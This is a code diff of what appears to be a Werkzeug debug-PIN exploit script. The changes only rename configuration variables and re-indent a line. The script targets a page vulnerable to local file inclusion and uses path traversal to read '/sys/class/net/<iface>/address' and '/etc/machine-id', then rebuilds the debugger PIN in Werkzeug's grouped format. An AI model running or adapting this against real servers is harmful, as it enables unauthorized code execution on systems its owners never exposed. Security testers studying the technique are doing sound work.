@@ -5,17 +5,18 @@ from base64 import b64encode
 import hashlib
 from itertools import chain
 
-user = ''   # Username to authenticate to Werkzeug
-passwd = '' # Password to authenticate to Werkzeug
-creds = b64encode("{0}:{1}".format(user, passwd).encode('UTF-8')).decode('ascii')
-iface = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
-rhost = ''  # IP address or hostname of the remote system hosting Werkzeug
-rport = ''  # Remote Port number of the service to access should be an integer, not a string.
+USER = ''   # Username to authenticate to Werkzeug
+PASSWD = '' # Password to authenticate to Werkzeug
+creds = b64encode("{0}:{1}".format(USER, PASSWD).encode('UTF-8')).decode('ascii')
 
-lfi_page_dir = ''   # Directory or page that allows LFI
-mac_path = '../../../../../sys/class/net/{0}/address'.format(iface) # Path to Mac Address
+IFACE = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
+RHOST = ''  # IP address or hostname of the remote system hosting Werkzeug
+RPORT = ''  # Remote Port number of the service to access should be an integer, not a string.
+
+LFI_PAGE_DIR = ''   # Directory or page that allows LFI
+mac_path = '../../../../../sys/class/net/{0}/address'.format(IFACE) # Path to Mac Address
 id_path = '../../../../../etc/machine-id'   # Path to Machine-ID
-url = 'http://{0}:{1}/{2}?filename='.format(rhost, rport, lfi_page_dir)
+url = 'http://{0}:{1}/{2}?filename='.format(RHOST, RPORT, LFI_PAGE_DIR)
 
 werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
 
@@ -78,7 +79,7 @@ if rv is None:
     for group_size in 5, 4, 3:
         if len(num) % group_size == 0:
             rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
-                          for x in range(0, len(num), group_size))
+                            for x in range(0, len(num), group_size))
             break
     else:
         rv = num
